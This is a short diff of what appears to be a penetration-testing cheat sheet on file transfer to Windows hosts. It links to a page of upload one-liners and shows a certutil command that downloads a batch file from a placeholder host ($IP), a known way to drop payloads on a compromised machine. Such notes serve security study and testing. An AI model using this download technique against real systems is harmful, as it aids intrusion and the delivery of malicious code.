@@ -175,6 +175,7 @@ ____
 [Windows One liners for file uploading](https://www.asafety.fr/en/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/)     
 
 **try certutil first - sometimes Powershell has problems, check size of file to see if transfer was successful** 
+
     certutil.exe -urlcache -split -f "http://$IP/file.bat" file.bat    
     
 ## Powershell
